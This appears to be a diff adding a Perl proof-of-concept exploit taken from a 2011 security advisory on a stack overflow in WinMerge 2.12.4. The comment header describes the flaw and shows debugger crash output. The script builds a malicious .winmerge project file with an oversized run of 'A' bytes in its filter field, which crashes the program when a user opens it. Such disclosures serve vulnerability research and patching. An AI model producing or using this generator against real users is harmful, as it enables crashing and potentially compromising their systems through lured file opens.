@@ -1,0 +1,105 @@
+#!/usr/bin/perl
+#
+#
+# Title: WinMerge v2.12.4 Project File Handling Stack Overflow Vulnerability
+#
+#
+# Vendor: Thingamahoochie Software
+# Product web page: http://www.winmerge.org
+# Affected version: 2.12.4.0 Unicode
+#
+# Summary: WinMerge is an Open Source differencing and merging tool for Windows.
+# WinMerge can compare both folders and files, presenting differences in a visual
+# text format that is easy to understand and handle. WinMerge is highly useful for
+# determining what has changed between project versions, and then merging changes
+# between versions. WinMerge can be used as an external differencing/merging tool
+# or as a standalone application.
+#
+# Desc: WinMerge version 2.12.4 suffers from a stack overflow vulnerability because
+# it fails to properly sanitize user supplied input when parsing .winmerge project
+# file format resulting in a crash overflowing the memory stack. The attacker can
+# use this scenario to lure unsuspecting users to open malicious crafted .winmerge
+# files with a potential for arbitrary code execution on the affected system.
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#
+# --------------------------------------------------------------------------------
+#
+# (e34.10b0): Stack overflow - code c00000fd (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000011 ebx=0001f83c ecx=50000161 edx=7ffe0300 esi=00000000 edi=00c30000
+# eip=7c90cf78 esp=00033000 ebp=00033238 iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+# ntdll!NtAllocateVirtualMemory+0xa:
+# 7c90cf78 ff12            call    dword ptr [edx]      ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c90e510)}
+# 0:000> g
+# (e34.10b0): C++ EH exception - code e06d7363 (first chance)
+# (e34.10b0): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000d28 ebx=00523001 ecx=00000000 edx=00000000 esi=00000000 edi=00031ad8
+# eip=7c90e8e5 esp=00030c9c ebp=000319d4 iopl=0         nv up ei pl nz ac pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
+# ntdll!strchr+0xd8:
+# 7c90e8e5 53              push    ebx
+#
+# --------------------------------------------------------------------------------
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# liquidworm gmail com
+# Zero Science Lab - http://www.zeroscience.mk
+#
+#
+# Advisory ID: ZSL-2010-4997
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4997.php
+#
+#
+# 08.02.2011
+#
+
+
+use strict;
+
+my $project = "thricer.winmerge";
+
+my $begining = "\x3C\x3F\x78\x6D\x6C\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E".
+	       "\x30\x22\x20\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x55\x54\x46\x2D".
+	       "\x38\x22\x20\x73\x74\x61\x6E\x64\x61\x6C\x6F\x6E\x65\x3D\x22\x79\x65".
+	       "\x73\x22\x3F\x3E\x0D\x0A\x0D\x0A\x3C\x70\x72\x6F\x6A\x65\x63\x74\x3E".
+	       "\x0D\x0A\x20\x20\x20\x3C\x70\x61\x74\x68\x73\x3E\x0D\x0A\x20\x20\x20".
+	       "\x20\x20\x20\x3C\x66\x69\x6C\x74\x65\x72\x3E";
+
+my $load =     "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+
+my $ending =   "\x2A\x2E\x2A\x3C\x2F\x66\x69\x6C\x74\x65\x72\x3E\x0D\x0A\x20\x20\x20".
+	       "\x20\x20\x20\x3C\x73\x75\x62\x66\x6F\x6C\x64\x65\x72\x73\x3E\x30\x3C".
+	       "\x2F\x73\x75\x62\x66\x6F\x6C\x64\x65\x72\x73\x3E\x0D\x0A\x20\x20\x20".
+	       "\x20\x20\x20\x3C\x6C\x65\x66\x74\x2D\x72\x65\x61\x64\x6F\x6E\x6C\x79".
+	       "\x3E\x30\x3C\x2F\x6C\x65\x66\x74\x2D\x72\x65\x61\x64\x6F\x6E\x6C\x79".
+	       "\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x3C\x72\x69\x67\x68\x74\x2D\x72".
+	       "\x65\x61\x64\x6F\x6E\x6C\x79\x3E\x30\x3C\x2F\x72\x69\x67\x68\x74\x2D".
+	       "\x72\x65\x61\x64\x6F\x6E\x6C\x79\x3E\x0D\x0A\x20\x20\x20\x3C\x2F\x70".
+	       "\x61\x74\x68\x73\x3E\x0D\x0A\x3C\x2F\x70\x72\x6F\x6A\x65\x63\x74\x3E".
+	       "\x0D\x0A";
+
+
+print "\n\n[*] Buffering \"$project\" file ...\n";
+open winmerge, ">./$project" || die "\nCan't open $project: $!";
+print winmerge $begining.$load x(2391-142+1000).$ending;
+sleep 2;
+print "\n[*] File created successfully!\n\n";
+close winmerge;
